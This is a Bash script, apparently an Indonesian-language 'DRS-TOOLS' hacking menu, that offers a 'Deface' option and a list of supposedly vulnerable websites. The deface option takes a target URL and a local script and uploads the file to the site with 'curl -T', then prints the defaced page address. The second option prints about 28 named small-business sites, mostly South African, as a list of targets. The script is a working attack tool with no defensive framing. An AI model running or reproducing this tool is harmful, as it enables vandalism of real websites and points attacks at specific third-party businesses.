blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
echo
echo
echo $yellow"××××××××××××××××××××××××××××××××××××××××××××××××××××××××"
echo $red"                   DARK RABBIT SECURITY"
echo $yellow"××××××××××××××××××××××××××××××××××××××××××××××××××××××××"
echo $purple"                         DRS-TOOLS"
echo $green"                       Author : suhandi"
echo $cyan"                contact : rabbtdark28@gmail.com"
echo $yellow"××××××××××××××××××××××××××××××××××××××××××××××××××××××××"
echo $purple"           thanks to : Mr.Ghost Includex & Frezz"
echo $yellow"××××××××××××××××××××××××××××××××××××××××××××××××××××××××"
echo $green" [A].Deface"
echo $green" [B].web vuln"
echo $green" [C].exit"
echo $yellow"××××××××××××××××××××××××××××××××××××××××××××××××××××××××"
echo $purple"MASUKAN PILIHAN ANDA"
echo $red" "
read -p " DRS@root# "  apaan

if [ $apaan = "A" ] || [ $apaan = "a" ]
then
clear
echo $yellow"××××××××××××××××××××××××××××××××××××××××××××××××××××××××"
echo $red"                   DARK RABBIT SECURITY"
echo $green"                    Author : suhandi"
echo $yellow"××××××××××××××××××××××××××××××××××××××××××××××××××××××××"
figlet -f shadow Defacer Dark Rabbit
echo $cyan" Masukan Web Target"
echo $red" "
read -p " DRS@root# "  target
echo $cyan" Masukan Script Kamu"
read -p " DRS@root# " script
curl -T /storage/emulated/0/$script $target
echo $green"Hasil deface =>$target/$script"
echo $cyan"["$blue"b"$cyan"]"$yellow"back "$cyan"["$blue"q"$cyan"]"$purple"quit"
read -p "[b/q] : " back
fi

if [ $apaan = "B" ] || [ $apaan = "b" ]
then
clear
echo $yellow"××××××××××××××××××××××××××××××××××××××××××××××××××××××××"
echo $red"                   DARK RABBIT SECURITY"
echo $yellow"××××××××××××××××××××××××××××××××××××××××××××××××××××××××"
echo $purple"                    KUMPULAN WEB VULN"
echo $yellow"××××××××××××××××××××××××××××××××××××××××××××××××××××××××"
echo
echo $cyan"http://bitsandpieces.co.za"
echo $cyan"http://cblandscapes.co.za"
echo $cyan"http://windmillsandporcupines.co.za"
echo $cyan"http://scnc.co.za"
echo $cyan"http://contsol.co.za"
echo $cyan"http://consultec.co.za"
echo $cyan"http://colourfactory.co.za"
echo $cyan"http://ayk.co.za"
echo $cyan"http://daretogowildafrica.co.za"
echo $cyan"http://floralandfresh.co.za"
echo $cyan"http://foodconsult.co.za"
echo $cyan"http://itsengineering.co.za"
echo $cyan"http://hybriddevelopments.co.za"
echo $cyan"http://holotropicbreathwork.co.za"
echo $cyan"http://hanover-cs.co.za"
echo $cyan"http://handj.co.za"
echo $cyan"htp://lwrm.co.za"
echo $cyan"http://lubbestrust.co.za"
echo $cyan"http://lpenterprises.co.za"
echo $cyan"http://kwalitycommodities.co.za"
echo $cyan"http://mestern.co.za"
echo $cyan"http://megro.co.za"
echo $cyan"http://bitpc.co.za"
echo $cyan"http://butterflowers.co.za"
echo $cyan"http://beeit.co.za"
echo $cyan"http://esfml.com"
echo $cyan"http://bee-it.co.za"
echo $cyan"http://mc3qs.com"
echo $cyan"["$blue"b"$cyan"]"$yellow"back "$cyan"["$blue"q"$cyan"]"$purple"quit"
read -p "[b/q] : " back
fi

if [ $apaan = "C" ] || [ $apaan = "c" ]
then
exit
fi
